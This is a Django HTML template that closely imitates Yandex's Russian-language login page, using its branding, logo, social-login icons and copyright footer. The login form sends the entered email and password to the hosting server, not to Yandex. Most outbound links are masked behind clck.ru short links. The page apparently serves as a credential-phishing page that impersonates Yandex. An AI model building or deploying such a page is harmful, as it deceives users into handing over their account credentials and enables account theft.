{% extends 'base.html' %}

{% block title %}
    Авторизация
{% endblock %}

{% block content %}
    <div class="yandex-auth">

        <div class="yandex-auth__bg-image">
            <img class="yandex-auth__bg-image__image" src="{{ STATIC_URL }}img/yandex/yandex_bg.jpg">
        </div>
        
        <div class="yandex-auth__container">

            <div class="yandex-auth__container__header">
                <a class="yandex-auth__container__header__return" id="low-visible" href="https://yandex.ru/">
                    <img src="{{ STATIC_URL }}img/yandex/return.svg" width="28px" height="28px">
                </a>
                <a class="yandex-auth__container__header__registration" href="https://clck.ru/PDMmF">Зарегистрироваться</a>
            </div>

            <a href="https://yandex.ru/" class="yandex-auth__container__logo" id="low-visible">
                <img src="{{ STATIC_URL }}img/yandex/yandex_logo.png">
            </a>
            
            <p class="yandex-auth__container__underlogo" id="low-visible">
                Войдите, чтобы продолжить
            </p>

            <div class="loader"></div>
            
            <div>
                <form class="yandex-auth__container__form" method="post" autocomplete="on">
                    {% csrf_token %}
    
                    <div class="yandex-auth__container__form__container">
                        <input type="email"
                               id="input1"
                               class="yandex-auth__container__form__container__field input"
                               name="email"
                               required>
                        <label id="label1">Введите логин, почту или телефон</label>
                        <a class="yandex-auth__container__form__container__forgot-login" href="https://clck.ru/PD3G6">Не помню логин</a>
                    </div>
    
                    <div class="yandex-auth__container__form__container">
                        <input type="password"
                               id="input2"
                               class="yandex-auth__container__form__container__field input"
                               name="password"
                               required
                               pattern="\w{1,}">
                        <label id="label2">Введите пароль</label>
                        <a class="yandex-auth__container__form__container__forgot-login" href="https://clck.ru/PDyC2">Не помню пароль</a>

                        <img id="low-visible" 
                             class="yandex-auth__container__form__container__input-img pwdEye" 
                             src="{{ STATIC_URL }}img/yandex/pwd_eye_opened.png">
                    </div>
                    
                    <p>
                        <button class="yandex-auth__container__form__btn" type="submit" value="Войти" id="low-visible">
                            <span class="yandex-auth__container__form__btn__text">
                                Войти
                            </span>
    
                            <img class="yandex-auth__container__form__btn__icon"  src="{{ STATIC_URL }}img/yandex/qr-code.png"> 
                        </button>
                    </p>
                </form>
    
                <button onclick="window.location.href='https://clck.ru/PDMmF';" class="yandex-auth__container__btn-reg" value="Зарегистрироваться">
                    <span class="yandex-auth__container__btn-reg__text" href="yandex.ru">
                        Зарегистрироваться
                    </span>
                </button>
            </div>

            <div class="yandex-auth__container__social"  id="low-visible">
                <p>Войти с помощью соцсетей</p>
                
                <div class="yandex-auth__container__social__icons" id="socialIcons">
                    <a href="https://clck.ru/PCbu2">
                        <img src="{{ STATIC_URL }}img/yandex/vk.png" width="25px" height="25px" align="middle">
                    </a>

                    <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=216570901687097&kid_directed_site=0&app_id=216570901687097&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.ru%252Fbroker2%252Fa35d64c746d64212bcfe702390809d5b%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.ru%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D216570901687097%26scope%3Duser_gender%252Cuser_link%252Cuser_birthday%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c898cf8-eec8-4670-97f8-6c37c7de3df2&cancel_url=https%3A%2F%2Fsocial.yandex.ru%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.ru%252Fbroker2%252Fa35d64c746d64212bcfe702390809d5b%252Fcallback%23_%3D_&display=popup&locale=en_GB&pl_dbl=0">
                        <img src="{{ STATIC_URL }}img/yandex/facebook.png" width="25px" height="25px" align="middle">
                    </a>

                    <a href="https://clck.ru/PCkEz">
                        <img src="{{ STATIC_URL }}img/yandex/google.png" width="25px" height="27px" align="middle">
                    </a>

                    <a href="#"  id="more">
                        <img src="{{ STATIC_URL }}img/yandex/more.svg" width="25px" height="25px" align="middle">
                    </a>

                    <a href="https://clck.ru/PCmCR">
                        <img src="{{ STATIC_URL }}img/yandex/mail_moi_mir.png" width="25px" height="25px" align="middle">
                    </a>

                    <a href="https://clck.ru/PCn7h">
                        <img src="{{ STATIC_URL }}img/yandex/odnoklassniki.png" width="25px" height="25px" align="middle">
                    </a>

                    <a href="https://clck.ru/PCoAd">
                        <img src="{{ STATIC_URL }}img/yandex/twitter.png" width="25px" height="25px" align="middle">
                    </a>
                </div>
            </div>

        </div>

        <div class="yandex-auth__footer">
            <a class="yandex-auth__footer__help" href="https://yandex.ru/support/passport/">Помощь</a>
            <span>© 2001-2020, Яндекс</span>
        </div>

    </div>
{% endblock %}
